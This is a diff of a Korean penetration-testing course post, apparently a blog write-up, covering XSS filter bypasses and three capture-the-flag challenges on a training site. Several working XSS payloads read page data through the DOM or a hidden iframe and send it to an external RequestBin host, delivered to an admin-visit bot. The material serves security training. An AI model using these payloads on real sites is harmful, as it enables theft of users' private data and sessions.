@@ -1,13 +1,4 @@
----
-layout: article
-permalink: /posts/Penetration Testing | Week 11
-title: Penetration Testing | Week 11
-date: 2025/06/25
-excerpt: XSS 취약점 응용
-categories: 모의 해킹
----
-
-{{ site.pages.first.content | split: page.path }}
+# Penetration Testing | Week 11
 
 ## 강의 노트
 
@@ -53,12 +44,16 @@ Blacklist 필터링의 다양한 우회 기법들을 살펴보자. 예를 들어
 
 `onerror` 외에도 다양한 이벤트 속성이 존재하며, 여러 방식으로 XSS 공격에 활용될 수 있다. 아래는 대표적인 예시 중 일부이다.
 
-<pre><button class="copy-button"></button><code class="language-html" highlighted><data class="code-line" value="1"><span class="hljs-comment">// 웹 페이지 로드 후 스크립트 실행</span>
-</data><data class="code-line" value="2"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">"alert(1);"</span>&gt;</span>
-</data><data class="code-line" value="3">
-</data><data class="code-line" value="4"><span class="hljs-comment">// 요소가 포커스될 경우 스크립트 실행(autofocus 속성으로 인해 자동으로 포커스됨)</span>
-</data><data class="code-line" value="5"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">autofocus</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">"alert(1);"</span>&gt;
-</data></code></pre>
+<style id="code-1">
+  #code-1 + pre data:is([value="1"], [value="4"]) span {color: #6A737D !important;}
+</style>
+```html
+// 웹 페이지 로드 후 스크립트 실행
+<body onload="alert(1);">
+
+// 요소가 포커스될 경우 스크립트 실행(autofocus 속성으로 인해 자동으로 포커스됨)
+<input type="text" autofocus onfocus="alert(1);">
+```
 
 <br>
 
@@ -66,7 +61,7 @@ Blacklist 필터링의 다양한 우회 기법들을 살펴보자. 예를 들어
 
 웹 브라우저의 주소 창에서 직접 JavaScript 코드를 실행할 수 있다는 점을 악용하는 방법도 존재한다. 예를 들어, 브라우저 주소 창에 `javascript:alert(1);`을 입력하면 `alert(1)`이 실행되어 다음과 같이 알림 창이 표시된다.
 
-![JavaScript URL](/posts/Penetration%20Testing%20%7C%20Week%2011/1.webp)
+![JavaScript URL](/posts/penetration-testing-week-11/assets/1.webp)
 
 이와 같은 특성을 활용하여 스크립트를 삽입하는 방법으로는 `<a>` 태그를 이용하는 방식이 있다. 다음의 예시 코드를 보자.
 
@@ -181,7 +176,7 @@ targetDoc.getElementsByTagName('p');
 
 ### ClientScript CTF
 
-![ClientScript CTF](/posts/Penetration%20Testing%20%7C%20Week%2011/2.webp)
+![ClientScript CTF](/posts/penetration-testing-week-11/assets/2.webp)
 
 CTF를 해결하며 XSS 취약점을 활용한 다양한 공격 기법들을 실습해 보자.
 
@@ -189,53 +184,57 @@ CTF를 해결하며 XSS 취약점을 활용한 다양한 공격 기법들을 실
 
 #### Basic Script Prac
 
-![Basic Script Prac](/posts/Penetration%20Testing%20%7C%20Week%2011/3.webp){:style="padding: 0 25%; background-color: white;"}
+![Basic Script Prac](/posts/penetration-testing-week-11/assets/3.webp){:style="padding: 0 25%; background-color: white;"}
 
 링크를 통해 접속하면 회원제 게시판 애플리케이션으로 이동한다.
 
 회원 가입 및 로그인을 진행한 후, 마이페이지에서 플래그의 위치를 파악할 수 있었다.
 
-![Basic Script Prac](/posts/Penetration%20Testing%20%7C%20Week%2011/4.webp)
+![Basic Script Prac](/posts/penetration-testing-week-11/assets/4.webp)
 
 Burp Suite를 활용하여 해당 위치가 정확히 어떤 요소인지 확인해 보았다.
 
-![Basic Script Prac](/posts/Penetration%20Testing%20%7C%20Week%2011/5.webp)
+![Basic Script Prac](/posts/penetration-testing-week-11/assets/5.webp)
 
 그 결과 두 번째 `<input>` 태그의 `placeholder`에 플래그가 존재함을 알 수 있었다.
 
 다음으로 관리자 정보 추출을 위해 XSS 취약점을 탐색해 보았다. 마이페이지에 취약점이 존재한다고 하였으므로, `user` 파라미터에 전달된 값이 그대로 첫 번째 입력란에 표시되고 있을 가능성이 높다고 판단하였다. 따라서 `user` 파라미터의 값을 `<'">`로 수정한 뒤 요청을 전송해 보았다.
 
-![Basic Script Prac](/posts/Penetration%20Testing%20%7C%20Week%2011/6.webp)
+![Basic Script Prac](/posts/penetration-testing-week-11/assets/6.webp)
 
 특수 문자가 별도의 변환 처리 없이 그대로 서버 응답에 반환되는 것을 확인하였다. 이어서 `<script>` 태그가 사용 가능한지 확인해 보았다.
 
-![Basic Script Prac](/posts/Penetration%20Testing%20%7C%20Week%2011/7.webp)
+![Basic Script Prac](/posts/penetration-testing-week-11/assets/7.webp)
 
 `<script>` 태그 역시 별도의 필터링 없이 서버 응답에 정상적으로 포함되었다. 따라서 XSS 공격이 가능하다고 판단하고 삽입할 페이로드를 다음과 같이 작성하였다.
 
-<pre><button class="copy-button"></button><code class="language-js" highlighted><data class="code-line" value="1"><span class="hljs-string">"</span>/&gt;
-</data><data class="code-line" value="2"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">
-</data><data class="code-line" value="3" style="--indent: 2ch;">  <span class="hljs-comment">// 두 번째 input 태그의 placeholder 접근</span>
-</data><data class="code-line" value="4" style="--indent: 2ch;">  <span class="hljs-keyword">var</span> flag = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">'input'</span>)[<span class="hljs-number">1</span>].<span class="hljs-property">placeholder</span>;
-</data><data class="code-line" value="5">
-</data><data class="code-line" value="6" style="--indent: 2ch;">  <span class="hljs-comment">// flag를 RequestBin 엔드포인트로 전송</span>
-</data><data class="code-line" value="7" style="--indent: 2ch;">  <span class="hljs-keyword">var</span> img = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>();
-</data><data class="code-line" value="8" style="--indent: 2ch;">  img.<span class="hljs-property">src</span> = <span class="hljs-string">"https://vxvufng.request.dreamhack.games/?flag="</span> + flag;
-</data><data class="code-line" value="9"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
-</data><data class="code-line" value="10">&lt;
-</data></code></pre>
+<style id="code-2">
+  #code-2 + pre data[value="10"] span {color: #24292E !important; font-style: normal !important;}
+</style>
+```html
+"/>
+<script>
+  // 두 번째 input 태그의 placeholder 접근
+  var flag = document.getElementsByTagName('input')[1].placeholder;
+
+  // flag를 RequestBin 엔드포인트로 전송
+  var img = new Image();
+  img.src = "https://vxvufng.request.dreamhack.games/?flag=" + flag;
+</script>
+<
+```
 
 이후 `user` 파라미터에 해당 페이로드를 삽입하여 요청을 전송해 보았다.
 
-![Basic Script Prac](/posts/Penetration%20Testing%20%7C%20Week%2011/8.webp)
+![Basic Script Prac](/posts/penetration-testing-week-11/assets/8.webp)
 
 악성 스크립트가 서버 응답에 정상적으로 포함되었으나, RequestBin에서는 요청이 수신되지 않았다. 이에 대해 잠시 고민한 결과, 브라우저의 개발자 도구를 통해 원인을 파악할 수 있었다.
 
-![Basic Script Prac](/posts/Penetration%20Testing%20%7C%20Week%2011/9.webp)
+![Basic Script Prac](/posts/penetration-testing-week-11/assets/9.webp)
 
 콘솔에 `Uncaught TypeError: Cannot read properties of undefined`라는 오류 메시지가 출력되고 있었다. 즉, 정의되지 않은 요소의 속성 값을 가져오려고 시도했다는 의미이다. 해당 오류의 원인은 비교적 신속하게 파악할 수 있었는데, 바로 `<script>` 태그가 두 번째 `<input>` 태그보다 상위에 위치하고 있었기 때문이었다. HTML 문서는 순차적으로 실행되기 때문에 `<script>` 태그 내의 코드가 실행되는 시점에서는 플래그가 위치한 요소가 아직 DOM에 생성되지 않았던 것이다.
 
-이를 해결할 수 있는 방안 중 하나로 **DOMContetLoaded** 이벤트를 사용하는 방법이 있다.
+이를 해결할 수 있는 방안 중 하나로 **DOMContentLoaded** 이벤트를 사용하는 방법이 있다.
 
 > <strong>DOMContentLoaded</strong>
 >
@@ -243,37 +242,70 @@ Burp Suite를 활용하여 해당 위치가 정확히 어떤 요소인지 확인
 >
 > 아래는 DOMContentLoaded 이벤트를 사용하는 예시이다.
 >
-> <pre><button class="copy-button"></button><code class="language-js" highlighted><data class="code-line" value="1">...
-> </data><data class="code-line" value="2"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>
-> </data><data class="code-line" value="3" style="--indent: 2ch;">  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'DOMContentLoaded'</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) {
-> </data><data class="code-line" value="4" style="--indent: 4ch;">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'submit-btn'</span>));
-> </data><data class="code-line" value="5" style="--indent: 2ch;">  });
-> </data><data class="code-line" value="6"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
-> </data><data class="code-line" value="7"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"submit-btn"</span>&gt;</span>Submit<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
-> </data><data class="code-line" value="8">...
-> </data></code></pre>
+> ```html
+> ...
+> <script>
+>   document.addEventListener('DOMContentLoaded', function () {
+>     console.log(document.getElementById('submit-btn'));
+>   });
+> </script>
+> <button id="submit-btn">Submit</button>
+> ...
+> ```
 
 다른 해결 방안으로는 `<img>` 태그의 `onerror` 속성을 통한 이벤트 핸들러를 활용하는 방법이 있다. 이미지를 로딩하는 데에는 일정 시간이 소요되므로 그 사이에 DOM 요소가 정상적으로 로드될 수 있는 여유가 발생하고, 이에 따라 하위에 위치한 요소에 접근할 수 있기 때문이다. 해당 방법이 스크립트가 간결할 것으로 생각되어 이를 채택하였으며, 페이로드를 다음과 같이 수정하였다.
 
-<pre><button class="copy-button"></button><code class="language-js" highlighted><data class="code-line" value="1"><span class="hljs-string">"</span>/&gt;
-</data><data class="code-line" value="2"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"x"</span></span>
-</data><data class="code-line" value="3" style="--indent: 5ch;">     <span class="hljs-attr">onerror</span>=<span class="hljs-string">"</span>
-</data><data class="code-line" value="4" style="--indent: 7ch;">       <span class="hljs-keyword">var</span> flag = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">'input'</span>)[<span class="hljs-number">1</span>].<span class="hljs-property">placeholder</span>;
-</data><data class="code-line" value="5" style="--indent: 7ch;">       <span class="hljs-keyword">var</span> img = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>();
-</data><data class="code-line" value="6" style="--indent: 7ch;">       img.<span class="hljs-property">src</span> = <span class="hljs-string">'https://vxvufng.request.dreamhack.games/?flag='</span> + flag;
-</data></code></pre>
+```html
+"/>
+<img src="x"
+     onerror="
+       var flag = document.getElementsByTagName('input')[1].placeholder;
+       var img = new Image();
+       img.src = 'https://vxvufng.request.dreamhack.games/?flag=' + flag;
+```
+<script>
+  (() => {
+    window.patchCodeLine = (lineNumber, override) => {
+      const code = document.currentScript.previousElementSibling.querySelector('code');
 
-![Basic Script Prac](/posts/Penetration%20Testing%20%7C%20Week%2011/10.webp)
+      const patch = () => {
+        const line = code.querySelector(`.code-line[value="${lineNumber}"]`);
+        const lineContent = new DOMParser().parseFromString(override, 'text/html');
 
-![Basic Script Prac](/posts/Penetration%20Testing%20%7C%20Week%2011/11.webp){:style="padding: 0 25%; background-color: white"}
+        line.replaceChildren(...lineContent.body.childNodes);
+        line.appendChild(document.createTextNode('\n'));
+
+        observer.disconnect();
+      };
+
+      const observer = new MutationObserver(patch);
+
+      observer.observe(code, { attributes: true, attributeFilter: ['highlighted'] });
+
+      if (code.hasAttribute('highlighted')) patch();
+    };
+
+    patchCodeLine(6, [
+      '<span style="color:#24292E">       img.src </span>',
+      '<span style="color:#D73A49">=</span>',
+      '<span style="color:#032F62"> \'https://vxvufng.request.dreamhack.games/?flag=\'</span>',
+      '<span style="color:#D73A49"> +</span>',
+      '<span style="color:#24292E"> flag;</span>'
+    ].join(''));
+  })();
+</script>
+
+![Basic Script Prac](/posts/penetration-testing-week-11/assets/10.webp)
+
+![Basic Script Prac](/posts/penetration-testing-week-11/assets/11.webp){:style="padding: 0 25%; background-color: white"}
 
 이벤트 핸들러에 악성 스크립트가 정상적으로 등록되며, RequestBin에서도 요청이 수신되는 것을 확인할 수 있다. 해당 요청의 URL을 복사하여 관리자 방문 Bot 페이지에 붙여 넣은 후 관리자가 해당 URL로 접근하도록 하였다.
 
-![Basic Script Prac](/posts/Penetration%20Testing%20%7C%20Week%2011/12.webp)
+![Basic Script Prac](/posts/penetration-testing-week-11/assets/12.webp)
 
 이후 RequestBin에서 관리자 정보가 포함된 요청을 수신하여 플래그를 획득하였다.
 
-![Basic Script Prac](/posts/Penetration%20Testing%20%7C%20Week%2011/13.webp){:style="padding: 0 20%; background-color: white"}
+![Basic Script Prac](/posts/penetration-testing-week-11/assets/13.webp){:style="padding: 0 20%; background-color: white"}
 
 Flag: <span style="color: green">segfault{<span style="filter: blur(5px); overflow-wrap:anywhere;">BasicScriptSOEaasy</span>}</span>
 {:style="text-align: center;"}
@@ -282,46 +314,47 @@ Flag: <span style="color: green">segfault{<span style="filter: blur(5px); overfl
 
 #### Steal Info
 
-![Steal Info](/posts/Penetration%20Testing%20%7C%20Week%2011/14.webp){:style="padding: 0 25%; background-color: white;"}
+![Steal Info](/posts/penetration-testing-week-11/assets/14.webp){:style="padding: 0 25%; background-color: white;"}
 
 먼저 중요 정보가 존재한다는 `mypage.html`과 `secret.php`로 각각 접속해 보았다.
 
-![Steal Info](/posts/Penetration%20Testing%20%7C%20Week%2011/15.webp)
-![Steal Info](/posts/Penetration%20Testing%20%7C%20Week%2011/16.webp)
+![Steal Info](/posts/penetration-testing-week-11/assets/15.webp)
+![Steal Info](/posts/penetration-testing-week-11/assets/16.webp)
 
 `mypage.html`은 간단한 마이페이지의 형태였으며, 내 정보 탭에 `This is a Very Secret Info.`라는 텍스트가 출력되고 있었다. `secret.php`에서는 관리자가 아닌 일반 사용자 권한으로 접근하였기 때문에 권한이 없다는 메시지가 출력되었으나, 관리자가 해당 페이지에 접속한 경우 내 정보 탭에 플래그가 출력될 것으로 예측되었다.
 
 다음으로 회원제 게시판으로 이동하여 XSS 취약점을 탐색하였다.
 
-![Steal Info](/posts/Penetration%20Testing%20%7C%20Week%2011/17.webp)
+![Steal Info](/posts/penetration-testing-week-11/assets/17.webp)
 
 게시판에 글을 작성하고 게시물 열람 페이지에서 서버 응답을 분석한 결과 글 내용에 포함된 특수 문자가 별도 변환 처리 없이 그대로 전달되는 것을 확인하였다. 또한 `<script>` 태그 역시 삽입이 가능함을 확인함에 따라 XSS 취약점이 존재하는 위치를 특정할 수 있었다.
 
 취약점이 존재하는 페이지는 `notice_write.php`이고, 플래그가 존재하는 페이지는 `secret.php`이기 때문에 `<iframe>` 태그를 활용한 공격 전략을 구상하였다. 따라서 삽입 페이로드를 다음과 같이 작성하였다.
 
-<pre><button class="copy-button"></button><code class="language-js" highlighted><data class="code-line" value="1"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://ctf.segfaulthub.com:4343/scriptPrac/secret.php"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span>
-</data><data class="code-line" value="2"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>
-</data><data class="code-line" value="3" style="--indent: 2ch;">  <span class="hljs-keyword">var</span> targetDoc = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">'iframe'</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">contentDocument</span>;
-</data><data class="code-line" value="4">
-</data><data class="code-line" value="5" style="--indent: 2ch;">  <span class="hljs-comment">// mypage.html에서 'This is a Very Secret Info.' 텍스트에 해당하는 DOM 요소 접근</span>
-</data><data class="code-line" value="6" style="--indent: 2ch;">  <span class="hljs-keyword">var</span> flag = targetDoc.<span class="hljs-title function_">getElementsByClassName</span>(<span class="hljs-string">'card-text'</span>)[<span class="hljs-number">1</span>].<span class="hljs-property">innerHTML</span>;
-</data><data class="code-line" value="7" style="--indent: 2ch;">  
-</data><data class="code-line" value="8" style="--indent: 2ch;">  <span class="hljs-keyword">var</span> img = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>();
-</data><data class="code-line" value="9" style="--indent: 2ch;">  img.<span class="hljs-property">src</span> = <span class="hljs-string">"https://vxvufng.request.dreamhack.games/?flag="</span> + flag;
-</data><data class="code-line" value="10"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;
-</data></code></pre>
+```html
+<iframe src="http://ctf.segfaulthub.com:4343/scriptPrac/secret.php"></iframe>
+<script>
+  var targetDoc = document.getElementsByTagName('iframe')[0].contentDocument;
+
+  // mypage.html에서 'This is a Very Secret Info.' 텍스트에 해당하는 DOM 요소 접근
+  var flag = targetDoc.getElementsByClassName('card-text')[1].innerHTML;
+  
+  var img = new Image();
+  img.src = "https://vxvufng.request.dreamhack.games/?flag=" + flag;
+</script>
+```
 
 게시글 작성 페이지로 이동하여 위의 페이로드를 글 내용 입력란에 작성하고 게시물을 생성하였다.
 
-![Steal Info](/posts/Penetration%20Testing%20%7C%20Week%2011/18.webp)
+![Steal Info](/posts/penetration-testing-week-11/assets/18.webp)
 
 게시물 열람 페이지의 URL을 확인한 후, 관리자 방문 Bot 페이지에서 관리자가 해당 URL로 접근하도록 하였다.
 
-![Steal Info](/posts/Penetration%20Testing%20%7C%20Week%2011/19.webp)
+![Steal Info](/posts/penetration-testing-week-11/assets/19.webp)
 
 이후 RequestBin에서 관리자 정보가 포함된 요청을 수신하여 플래그를 획득하였다.
 
-![Steal Info](/posts/Penetration%20Testing%20%7C%20Week%2011/20.webp){:style="padding: 0 20%; background-color: white;"}
+![Steal Info](/posts/penetration-testing-week-11/assets/20.webp){:style="padding: 0 20%; background-color: white;"}
 
 Flag: <span style="color: green">segfault{<span style="filter: blur(5px); overflow-wrap:anywhere;">steaLInfo</span>}</span>
 {:style="text-align: center;"}
@@ -330,53 +363,55 @@ Flag: <span style="color: green">segfault{<span style="filter: blur(5px); overfl
 
 #### Steal Info 2
 
-![Steal Info 2](/posts/Penetration%20Testing%20%7C%20Week%2011/21.webp){:style="padding: 0 25%; background-color: white;"}
+![Steal Info 2](/posts/penetration-testing-week-11/assets/21.webp){:style="padding: 0 25%; background-color: white;"}
 
 링크를 통해 접속하여 Steal Info와 동일한 위치에 XSS 취약점이 존재한다는 사실을 파악하였다. 플래그의 위치는 마이페이지이기 때문에 마찬가지로 `<iframe>`을 활용해 페이로드를 작성하였다.
 
-<pre><button class="copy-button"></button><code class="language-js" highlighted><data class="code-line" value="1"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://ctf.segfaulthub.com:4343/scriptPrac2/mypage.php"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span>
-</data><data class="code-line" value="2"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>
-</data><data class="code-line" value="3" style="--indent: 2ch;">  <span class="hljs-keyword">var</span> targetDoc = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">'iframe'</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">contentDocument</span>;
-</data><data class="code-line" value="4">
-</data><data class="code-line" value="5" style="--indent: 2ch;">  <span class="hljs-comment">// mypage.php에서 정보 입력란에 해당하는 DOM 요소 접근</span>
-</data><data class="code-line" value="6" style="--indent: 2ch;">  <span class="hljs-keyword">var</span> flag = targetDoc.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'userInfo'</span>).<span class="hljs-property">placeholder</span>;
-</data><data class="code-line" value="7" style="--indent: 2ch;">  
-</data><data class="code-line" value="8" style="--indent: 2ch;">  <span class="hljs-keyword">var</span> img = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>();
-</data><data class="code-line" value="9" style="--indent: 2ch;">  img.<span class="hljs-property">src</span> = <span class="hljs-string">"https://vxvufng.request.dreamhack.games/?flag="</span> + flag;
-</data><data class="code-line" value="10"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;
-</data></code></pre>
+```html
+<iframe src="http://ctf.segfaulthub.com:4343/scriptPrac2/mypage.php"></iframe>
+<script>
+  var targetDoc = document.getElementsByTagName('iframe')[0].contentDocument;
+
+  // mypage.php에서 정보 입력란에 해당하는 DOM 요소 접근
+  var flag = targetDoc.getElementById('userInfo').placeholder;
+  
+  var img = new Image();
+  img.src = "https://vxvufng.request.dreamhack.games/?flag=" + flag;
+</script>
+```
 
 글 내용에 위 페이로드를 삽입하여 게시물을 생성한 후 열람해 보았다.
 
-![Steal Info 2](/posts/Penetration%20Testing%20%7C%20Week%2011/22.webp)
+![Steal Info 2](/posts/penetration-testing-week-11/assets/22.webp)
 
-Steal Info와 달리 `Uncaught TypeError: Cannot read properties of undefined`라는 오류 메시지가 출력되었다. 해당 오류의 원인을 분석한 결과, `<iframe>` 내의 마이페이지 로딩에 시간이 상당히 소요되는 듯했다. 이를 해결하기 위해 `<iframe>` 요소에 `onload` 이벤트 핸들러를 등록하여 마이페이지가 로딩된 이후 스크립트가 실행되도록 처리하였다. 수정된 페이로드는 다음과 같다.
+Steal Info와 달리 `Uncaught TypeError: Cannot read properties of undefined`라는 오류 메시지가 출력되었다. 해당 오류를 분석한 결과, 스크립트가 실행되는 시점에 `<iframe>` 내부 마이페이지의 로딩이 아직 완료되지 않은 것이 원인인 듯했다. 이를 해결하기 위해 `<iframe>` 요소에 `onload` 이벤트 핸들러를 등록하여 마이페이지가 로딩된 이후 스크립트가 실행되도록 처리하였다. 수정된 페이로드는 다음과 같다.
 
-<pre><button class="copy-button"></button><code class="language-js" highlighted><data class="code-line" value="1"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://ctf.segfaulthub.com:4343/scriptPrac2/mypage.php"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span>
-</data><data class="code-line" value="2"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>
-</data><data class="code-line" value="3" style="--indent: 2ch;">  <span class="hljs-keyword">var</span> target = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">'iframe'</span>)[<span class="hljs-number">0</span>];
-</data><data class="code-line" value="4">
-</data><data class="code-line" value="5" style="--indent: 2ch;">  target.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) {
-</data><data class="code-line" value="6" style="--indent: 4ch;">    <span class="hljs-keyword">var</span> targetDoc = target.<span class="hljs-property">contentDocument</span>;
-</data><data class="code-line" value="7">
-</data><data class="code-line" value="8" style="--indent: 4ch;">    <span class="hljs-comment">// mypage.php에서 정보 입력란에 해당하는 DOM 요소 접근</span>
-</data><data class="code-line" value="9" style="--indent: 4ch;">    <span class="hljs-keyword">var</span> flag = targetDoc.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'userInfo'</span>).<span class="hljs-property">placeholder</span>;
-</data><data class="code-line" value="10" style="--indent: 4ch;">    
-</data><data class="code-line" value="11" style="--indent: 4ch;">    <span class="hljs-keyword">var</span> img = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>();
-</data><data class="code-line" value="12" style="--indent: 4ch;">    img.<span class="hljs-property">src</span> = <span class="hljs-string">"https://vxvufng.request.dreamhack.games/?flag="</span> + flag;
-</data><data class="code-line" value="13" style="--indent: 2ch;">  }
-</data><data class="code-line" value="14"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;
-</data></code></pre>
+```html
+<iframe src="http://ctf.segfaulthub.com:4343/scriptPrac2/mypage.php"></iframe>
+<script>
+  var target = document.getElementsByTagName('iframe')[0];
 
-![Steal Info 2](/posts/Penetration%20Testing%20%7C%20Week%2011/23.webp)
+  target.onload = function () {
+    var targetDoc = target.contentDocument;
+
+    // mypage.php에서 정보 입력란에 해당하는 DOM 요소 접근
+    var flag = targetDoc.getElementById('userInfo').placeholder;
+    
+    var img = new Image();
+    img.src = "https://vxvufng.request.dreamhack.games/?flag=" + flag;
+  }
+</script>
+```
+
+![Steal Info 2](/posts/penetration-testing-week-11/assets/23.webp)
 
 수정된 페이로드를 사용해 게시물을 생성하자, 오류 없이 정상적으로 스크립트가 실행된 것을 확인하였다. 다음으로 게시물 열람 페이지의 URL을 확인한 후, 관리자 방문 Bot 페이지에서 관리자가 해당 URL로 접근하도록 하였다.
 
-![Steal Info 2](/posts/Penetration%20Testing%20%7C%20Week%2011/24.webp)
+![Steal Info 2](/posts/penetration-testing-week-11/assets/24.webp)
 
 이후 RequestBin에서 관리자 정보가 포함된 요청을 수신하여 플래그를 획득하였다.
 
-![Steal Info 2](/posts/Penetration%20Testing%20%7C%20Week%2011/25.webp){:style="padding: 0 20%; background-color: white;"}
+![Steal Info 2](/posts/penetration-testing-week-11/assets/25.webp){:style="padding: 0 20%; background-color: white;"}
 
 Flag: <span style="color: green">segfault{<span style="filter: blur(5px); overflow-wrap:anywhere;">GETITGETIT!</span>}</span>
 {:style="text-align: center;"}
